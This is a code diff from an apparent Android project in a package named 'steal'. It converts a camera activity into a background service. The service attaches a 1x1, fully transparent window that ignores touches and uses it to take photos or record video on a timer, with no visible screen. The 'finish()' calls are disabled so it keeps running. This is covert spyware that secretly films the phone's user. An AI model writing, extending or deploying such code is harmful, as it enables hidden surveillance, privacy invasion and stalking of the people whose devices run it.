@@ -1,26 +1,44 @@
-package com.xiaoxin.jhang.steal;
+package com.xiaoxin.jhang.steal.service;
 
 import android.app.Activity;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
 import android.hardware.Camera;
+import android.media.AudioManager;
 import android.media.CamcorderProfile;
 import android.media.MediaRecorder;
-import android.os.Bundle;
 import android.os.Handler;
-import android.support.v7.app.AppCompatActivity;
+import android.os.IBinder;
+import android.support.annotation.Nullable;
 import android.util.Log;
 import android.view.Surface;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
+import android.view.WindowManager;
+import android.view.WindowManager.LayoutParams;
+
+import com.xiaoxin.jhang.steal.CameraVideoActivity;
 import com.xiaoxin.jhang.steal.util.BitmapUtil;
 import com.xiaoxin.jhang.steal.util.FileUtil;
+
 import java.io.IOException;
 import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
 
-public class CameraVideoActivity extends AppCompatActivity {
+/**
+ * @author: xiaoxin
+ * date: 2018/5/31
+ * describe:
+ * 修改内容:
+ */
 
-    private static final String TAG = "CameraVideoActivity";
+public class CameraService extends Service {
+
+    private static String TAG = "---PhotoVideoService---";
+    private Context mContext;
+
     private MediaRecorder mMediaRecorder;
     private Camera mCamera;
     private SurfaceView mSurfaceView;
@@ -28,12 +46,31 @@ public class CameraVideoActivity extends AppCompatActivity {
     private boolean mIsRecording = false;
     private int mTime;
     private boolean mPicVideo;
+    public WindowManager mWindowManager;
+
+
+    @Nullable
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+
+    }
 
     @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_camera);
-        mSurfaceView = (SurfaceView)findViewById(R.id.surfaceview);
+    public void onCreate() {
+        // TODO Auto-generated method stub
+        super.onCreate();
+        mContext = getApplicationContext();
+        mWindowManager = (WindowManager) getApplication().getSystemService(Context.WINDOW_SERVICE);
+        mSurfaceView = new SurfaceView(getApplication());
+        LayoutParams params = new LayoutParams();
+        params.width = 1;
+        params.height = 1;
+        params.alpha = 0;
+        params.type = LayoutParams.FIRST_APPLICATION_WINDOW ;
+        // 屏蔽点击事件
+        params.flags = LayoutParams.FLAG_NOT_TOUCH_MODAL | LayoutParams.FLAG_NOT_FOCUSABLE | LayoutParams.FLAG_NOT_TOUCHABLE;
+        mWindowManager.addView(mSurfaceView, params);
 
         mSurfaceHolder = mSurfaceView.getHolder();
         mSurfaceHolder.addCallback(new SurfaceHolder.Callback() {
@@ -54,8 +91,13 @@ public class CameraVideoActivity extends AppCompatActivity {
             }
         });
 
-        mPicVideo = getIntent().getBooleanExtra("pic_video",false);
-        mTime = getIntent().getIntExtra("time",10);
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+
+        mPicVideo = intent.getBooleanExtra("pic_video",false);
+        mTime = intent.getIntExtra("time",10);
 
         if (mPicVideo) {  //拍照
             new Handler().postDelayed(new Runnable() {
@@ -76,8 +118,7 @@ public class CameraVideoActivity extends AppCompatActivity {
                 }
             },2000);
         }
-
-
+        return super.onStartCommand(intent, flags, startId);
     }
 
     /**
@@ -104,14 +145,14 @@ public class CameraVideoActivity extends AppCompatActivity {
         } catch (IOException e) {
             e.printStackTrace();
         }
-        setCameraDisplayOrientation(this, Camera.CameraInfo.CAMERA_FACING_BACK,mCamera);
+        setCameraDisplayOrientation(mContext, Camera.CameraInfo.CAMERA_FACING_BACK,mCamera);
         mCamera.startPreview();
     }
 
-    public static void setCameraDisplayOrientation(Activity activity,int cameraId, Camera camera) {
+    public void setCameraDisplayOrientation(Context ctx, int cameraId, Camera camera) {
         Camera.CameraInfo info = new Camera.CameraInfo();
         Camera.getCameraInfo(cameraId, info);
-        int rotation = activity.getWindowManager().getDefaultDisplay()
+        int rotation = mWindowManager.getDefaultDisplay()
                 .getRotation();
         int degrees = 0;
         switch (rotation) {
@@ -142,7 +183,7 @@ public class CameraVideoActivity extends AppCompatActivity {
 
             try {
                 mCamera.reconnect();
-                finish();
+//                finish();
             } catch (Exception e) {
                 Log.e(TAG, "File not found: " + e.getMessage());
             }
@@ -234,7 +275,8 @@ public class CameraVideoActivity extends AppCompatActivity {
         public void run() {
             stopMediaRecorder();
             this.cancel();
-            finish();
+//            finish();
         }
     }
+
 }
